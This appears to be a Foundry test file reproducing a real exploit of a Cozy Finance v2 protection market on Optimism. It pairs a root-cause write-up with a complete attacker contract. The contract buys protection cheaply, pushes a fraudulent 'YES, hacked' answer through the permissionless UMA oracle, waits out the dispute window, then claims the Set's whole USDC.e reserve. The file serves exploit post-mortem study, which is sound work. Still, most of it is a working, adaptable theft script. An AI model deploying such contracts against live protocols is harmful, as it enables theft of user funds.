// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

import "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// Cozy Finance (v2) protection-market exploit — Optimism. An attacker drained the entire USDC.e
// reserve of a Cozy Set by feeding a fraudulent "YES, the protocol was hacked" answer through the
// permissionless UMA Optimistic Oracle, letting the dispute window pass unchallenged, and then
// claiming the full protection payout on tokens they had just bought at a tiny premium.
//
// Exploit txs (Optimism):
//   TX1 (freeze) : 0x53b454a3f552c5498994f74ae8737faa60123cac274bdd3b0383ccb226b3f2cb (block 156364035)
//   TX2 (drain)  : 0x8761164b8947a0690b57896a8e7370dd69fe8e9137ce61e0b21ff08581a2ce60 (block 156580507)
// Attacker EOA   : 0x003FE7359A4E03C85Ac2f521eC699ED84C7c5ccB
// Victim Set     : 0x17705474203f7ff7ba8a940c433ab43d1f58e249 (EIP-1167 clone of set logic 0x17aff89b)
// Triggers       : 0xeb6613FAc35FeD17c276e3fE45d67da67685F1eF (market 5, "Did Aave v2 get hacked?")
//                  0xacd105feea362d5c27caaba0b45f53d91b92de27 (market 0)
// UMA OOv2       : 0x255483434aba5a75dc60c1391bB162BCd9DE2882
// Asset (payout) : 0x7F5c764cBc14f9669B88837ca1490cCa17c31607 (USDC.e, 6 decimals)
//
// The two on-chain txs are ~216k blocks (~5 days) apart because the UMA proposal has a 432,000s
// (5-day) custom liveness. TX1 buys protection and proposes the fraudulent YES answer (freezing the
// markets); TX2, after the liveness elapsed, settles the oracle and claims the payout. This PoC
// reproduces both steps with a warp in between.
//
// ROOT CAUSE (verified against the trigger's on-chain verified source, contract "UMATrigger" at
// 0xeb6613...; and against the two attack traces — NOT a key/signer compromise):
//
//   1. UMATrigger._submitRequestToOracle() posts a YES_OR_NO_QUERY to UMA's OptimisticOracleV2 as
//      an event-based request. Anyone may answer it: OptimisticOracleV2.proposePrice(...) is
//      permissionless (the proposer just posts the bond). The trigger's priceProposed() callback
//      does NOT verify that the underlying event (an Aave v2 hack) actually happened — it only
//      reverts if the proposed price is anything other than AFFIRMATIVE_ANSWER (1e18). So a bare
//      "YES" proposal from an arbitrary address is accepted and freezes the market.
//
//   2. If the proposal is not disputed within the liveness window, priceSettled() is invoked with
//      the AFFIRMATIVE answer and calls _updateTriggerState(TRIGGERED). There is no secondary
//      verification beyond "the proposal went unchallenged". runProgrammaticCheck() lets anyone
//      drive that settlement.
//
//   3. Cozy protection-token (CPT) eligibility is not snapshotted before the proposal. The attacker
//      buys protection (mints CPT via Set.purchase) at the normal small premium in the SAME tx as
//      the proposal, then — once the trigger flips to TRIGGERED — redeems that CPT via Set.claim
//      for the full protected notional, draining the Set's reserve.
//
// CONFIRMED PERMISSIONLESS: in the real TX1 the attacker's own contract (not the Cozy owner) calls
// OptimisticOracleV2.proposePrice directly; priceProposed only checks msg.sender == oracle and
// proposedPrice == AFFIRMATIVE. In the real TX2 the attacker's contract calls the trigger's
// runProgrammaticCheck() directly to settle. No privileged access anywhere in the path.
//
// Function names below are the exact 4-byte matches for the selectors seen in the traces. The
// UMATrigger and OptimisticOracleV2 signatures are from verified source. The Cozy Set logic
// (0x17aff89b) is unverified on Optimistic Etherscan, so its selectors were recovered by keccak
// match: purchase(uint16,uint256,address)=0xf09b77db, claim(uint16,uint256,address,address)=
// 0x06af14f1, markets(uint256)=0xb1283e77, setState()=0x1203402f.
//
// Run:
//   forge test --contracts src/test/2026-09/CozyFinance_exp.sol -vvv

interface IOptimisticOracleV2 {
    // Verified source (UMATrigger's embedded OptimisticOracleV2Interface). Permissionless: any
    // address may propose an answer by posting the bond. Returns the total bond posted.
    function proposePrice(
        address requester,
        bytes32 identifier,
        uint256 timestamp,
        bytes memory ancillaryData,
        int256 proposedPrice
    ) external returns (uint256 totalBond);
}

// Cozy UMATrigger (verified source at 0xeb6613...). Only the getters/entry points this PoC touches.
interface IUMATrigger {
    function oracle() external view returns (address);
    function query() external view returns (string memory);
    function requestTimestamp() external view returns (uint256);
    function queryIdentifier() external view returns (bytes32);
    function bondAmount() external view returns (uint256);
    function rewardToken() external view returns (address);
    function proposalDisputeWindow() external view returns (uint256);
    function state() external view returns (uint8); // 0=ACTIVE, 1=FROZEN, 2=TRIGGERED
    // Settles the oracle answer (invoking priceSettled) and, on AFFIRMATIVE, flips to TRIGGERED.
    function runProgrammaticCheck() external returns (uint8);
}

// Cozy Set (market container). The 13-field market tuple layout is taken directly from the on-chain
// markets(uint256) return; only ptoken and trigger are used here.
interface ICozySet {
    struct Market {
        address ptoken; // Cozy protection token (CPT) for this market
        address trigger;
        address costModel;
        address dripDecayModel;
        uint16 weight;
        uint16 purchaseFeeReserveFactor;
        uint16 saleFeeReserveFactor;
        uint8 state;
        uint256 activeProtection;
        uint256 lastDecayRate;
        uint256 lastDripRate;
        uint256 purchasesFeePool;
        uint256 lastDecayTime;
    }

    function markets(uint256 marketId) external view returns (Market memory);
    function setState() external view returns (uint8);
    function asset() external view returns (address);
    // Quote the premium for buying `protection` of coverage on `marketId`. First return value is the
    // total cost (in the Set asset) that must be transferred to the Set before calling purchase.
    function previewPurchase(uint16 marketId, uint256 protection) external view returns (uint256 totalCost);
    // Buy `protection` of coverage for `marketId`, minting CPT to `receiver`; pulls the premium.
    function purchase(uint16 marketId, uint256 protection, address receiver)
        external
        returns (uint256 totalCost, uint256 supplierFeeAmount);
    // Redeem CPT for the payout once the market is TRIGGERED.
    function claim(uint16 marketId, uint256 protectionTokens, address receiver, address owner)
        external
        returns (uint256 amount);
}

contract CozyFinance_exp is Test {
    address internal constant ATTACKER = 0x003FE7359A4E03C85Ac2f521eC699ED84C7c5ccB;
    ICozySet internal constant SET = ICozySet(0x17705474203F7ff7ba8a940c433AB43D1F58E249);
    IERC20 internal constant USDC = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);
    address internal constant TRIGGER1 = 0xeB6613FAC35fED17c276e3FE45D67Da67685f1eF; // market 5
    address internal constant TRIGGER2 = 0xaCD105FEEa362D5c27CAAbA0B45F53D91B92dE27; // market 0
    address internal constant UMA_OO = 0x255483434aba5a75dc60c1391bB162BCd9DE2882;

    // The two markets the attacker hit and the exact protection amounts bought (from the TX1 trace).
    // Their sum (162,312.70 USDC) equals the Set's entire USDC.e reserve at the fork block.
    uint16[2] internal MARKET_IDS = [uint16(5), uint16(0)];
    uint256[2] internal PROTECTION = [uint256(96_596_967_870), uint256(65_715_735_793)];

    CozyFinanceExploit internal exploit;

    function setUp() public {
        // Parent block of TX1: real protocol state immediately before the attack.
        vm.createSelectFork("optimism", 156_364_034);

        exploit = new CozyFinanceExploit(ATTACKER);

        // Seed the exploit with the attacker's OWN working capital: ~2,631 USDC of premiums plus
        // 2 x 1,000 USDC of UMA bonds/fees. This is not the stolen money — the drained reserve comes
        // out of the Set. 10k is a safe upper bound for premium + bond.
        deal(address(USDC), address(exploit), 10_000e6);

        vm.label(ATTACKER, "Attacker");
        vm.label(address(exploit), "Exploit");
        vm.label(address(SET), "CozySet(victim)");
        vm.label(address(USDC), "USDC.e");
        vm.label(TRIGGER1, "UMATrigger(Aave-v2)");
        vm.label(TRIGGER2, "UMATrigger(market0)");
        vm.label(UMA_OO, "UMA_OptimisticOracleV2");
    }

    function testExploit() public {
        uint256 setReserveBefore = USDC.balanceOf(address(SET));
        uint256 seedCapital = USDC.balanceOf(address(exploit));
        emit log_named_decimal_uint("Set USDC.e reserve before", setReserveBefore, 6);
        emit log_named_decimal_uint("attacker seed capital (own funds)", seedCapital, 6);

        // markets start ACTIVE
        assertEq(SET.markets(5).state, 0, "market5 should start ACTIVE");
        assertEq(SET.markets(0).state, 0, "market0 should start ACTIVE");

        // ---- TX1: buy protection cheaply, then submit the fraudulent unchallenged YES proposals ----
        vm.prank(ATTACKER, ATTACKER);
        exploit.buyAndPropose(MARKET_IDS, PROTECTION);

        // Both markets are now FROZEN by the accepted YES proposals (priceProposed callback).
        assertEq(IUMATrigger(TRIGGER1).state(), 1, "trigger1 should be FROZEN after YES proposal");
        assertEq(IUMATrigger(TRIGGER2).state(), 1, "trigger2 should be FROZEN after YES proposal");

        // ---- let the UMA dispute/liveness window (432,000s) elapse with no dispute ----
        vm.warp(block.timestamp + IUMATrigger(TRIGGER1).proposalDisputeWindow() + 1);

        // ---- TX2: settle the oracle (flip to TRIGGERED) and claim the full payout ----
        vm.prank(ATTACKER, ATTACKER);
        exploit.settleAndDrain(MARKET_IDS);

        // Both triggers accepted the unchallenged YES answer as a real event -> TRIGGERED.
        assertEq(IUMATrigger(TRIGGER1).state(), 2, "trigger1 should be TRIGGERED");
        assertEq(IUMATrigger(TRIGGER2).state(), 2, "trigger2 should be TRIGGERED");

        uint256 attackerProfit = USDC.balanceOf(ATTACKER); // attacker EOA started with 0 USDC.e
        uint256 setReserveAfter = USDC.balanceOf(address(SET));
        uint256 setDrained = setReserveBefore - setReserveAfter;

        emit log_named_decimal_uint("Set USDC.e reserve after", setReserveAfter, 6);
        emit log_named_decimal_uint("Set USDC.e drained", setDrained, 6);
        emit log_named_decimal_uint("attacker USDC.e profit (net of seed)", attackerProfit - seedCapital, 6);

        // Profit is measured in USDC.e (the Set's payout asset). The attacker swept ~163k USDC.e to
        // its EOA; net of the ~2.6k premium it seeded, that is ~$160k, matching the reported loss.
        assertGt(setDrained, 150_000e6, "should drain ~the full Set reserve");
        assertGt(attackerProfit - seedCapital, 150_000e6, "attacker net profit should be ~$160k USDC.e");
    }
}

// Named attacker contract. Mirrors the two on-chain txs: buyAndPropose == TX1, settleAndDrain == TX2.
// Every call is a real call against the victim's actual functions (no bytecode, no calldata replay).
contract CozyFinanceExploit {
    ICozySet internal constant SET = ICozySet(0x17705474203F7ff7ba8a940c433AB43D1F58E249);
    IERC20 internal constant USDC = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);
    int256 internal constant AFFIRMATIVE_YES = 1e18;

    address public immutable owner;

    constructor(address _owner) {
        owner = _owner;
    }

    // TX1 equivalent: for each target market, buy protection (mint CPT to self) and then push a
    // fraudulent YES answer into the permissionless UMA oracle for that market's trigger.
    function buyAndPropose(uint16[2] calldata marketIds, uint256[2] calldata protection) external {
        for (uint256 i = 0; i < marketIds.length; i++) {
            ICozySet.Market memory m = SET.markets(marketIds[i]);
            IUMATrigger trig = IUMATrigger(m.trigger);

            // 1) Acquire CPT through the normal market mechanism. This Set uses a transfer-then-call
            //    payment pattern: quote the premium, transfer exactly that to the Set, then purchase
            //    (purchase credits the balance delta as payment). Premium is ~1.3-1.4% of notional.
            uint256 premium = SET.previewPurchase(marketIds[i], protection[i]);
            USDC.transfer(address(SET), premium);
            SET.purchase(marketIds[i], protection[i], address(this));

            // 2) Submit an unchallenged YES=1e18 answer to the trigger's UMA request. Permissionless:
            //    this contract is neither the Cozy owner nor a privileged proposer; it just posts the
            //    bond. The trigger's priceProposed callback accepts it and freezes the market.
            IOptimisticOracleV2 oo = IOptimisticOracleV2(trig.oracle());
            USDC.approve(address(oo), type(uint256).max);
            oo.proposePrice(
                m.trigger, trig.queryIdentifier(), trig.requestTimestamp(), bytes(trig.query()), AFFIRMATIVE_YES
            );
        }
    }

    // TX2 equivalent: after liveness, settle each oracle answer (flipping the trigger to TRIGGERED)
    // and then redeem all held CPT for the payout, draining the Set. Sweep proceeds to the EOA.
    function settleAndDrain(uint16[2] calldata marketIds) external {
        // Settle first: runProgrammaticCheck -> oracle.settle -> priceSettled(YES) -> TRIGGERED.
        for (uint256 i = 0; i < marketIds.length; i++) {
            IUMATrigger(SET.markets(marketIds[i]).trigger).runProgrammaticCheck();
        }

        // Claim: the Set caps how much can be redeemed per call, so loop until CPT is fully burned
        // (this is exactly why the real TX2 issued ~55 claim calls per market).
        for (uint256 i = 0; i < marketIds.length; i++) {
            IERC20 cpt = IERC20(SET.markets(marketIds[i]).ptoken);
            for (uint256 j = 0; j < 500; j++) {
                uint256 bal = cpt.balanceOf(address(this));
                if (bal == 0) break;
                SET.claim(marketIds[i], bal, address(this), address(this));
                if (cpt.balanceOf(address(this)) == bal) break; // no progress -> Set exhausted
            }
        }

        USDC.transfer(owner, USDC.balanceOf(address(this)));
    }
}
